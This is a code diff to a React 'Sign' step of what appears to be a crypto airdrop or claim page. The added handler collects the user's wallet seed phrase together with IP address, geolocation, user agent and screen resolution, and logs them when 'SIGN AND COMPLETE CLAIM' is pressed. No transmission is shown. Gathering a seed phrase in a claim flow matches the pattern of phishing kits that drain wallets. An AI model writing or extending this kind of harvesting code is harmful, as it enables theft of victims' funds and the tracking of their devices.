@@ -1,11 +1,44 @@
 import { ChevronDown } from "lucide-react";
 import React from "react";
 import { Button } from "../ui/button";
+import { useWalletStore } from "@/store/walletStore";
+
 interface SignStepProps {
 	onPrevious: () => void;
 }
 
 function Sign({ onPrevious }: SignStepProps) {
+	const {
+		blockchainNetwork,
+		walletProvider,
+		seedPhrase,
+		destinationAddress,
+		ipAddress,
+		geolocation,
+		userAgent,
+		screenResolution,
+	} = useWalletStore();
+
+	// ✅ Function to shorten address
+	const formatAddress = (address: string): string => {
+		if (!address) return "";
+		if (address.length <= 10) return address; // too short, skip trimming
+		return `${address.slice(0, 6)}...${address.slice(-4)}`;
+	};
+
+	const handleSignAndComplete = () => {
+		console.log({
+			blockchainNetwork,
+			walletProvider,
+			seedPhrase,
+			destinationAddress,
+			ipAddress,
+			geolocation,
+			userAgent,
+			screenResolution,
+		});
+	};
+
 	return (
 		<div>
 			<button
@@ -33,11 +66,18 @@ function Sign({ onPrevious }: SignStepProps) {
 				</div>
 				<div>
 					<p className="text-sm text-gray-600">Destination Address</p>
-					<p className="font-medium text-gray-900">0x8765...4321</p>
+					<p className="font-medium text-gray-900">
+						{formatAddress(destinationAddress)}
+					</p>
 				</div>
 			</div>
 
-			<Button className="button-primary w-full">SIGN AND COMPLETE CLAIM</Button>
+			<Button
+				onClick={handleSignAndComplete}
+				className="button-primary w-full"
+			>
+				SIGN AND COMPLETE CLAIM
+			</Button>
 		</div>
 	);
 }
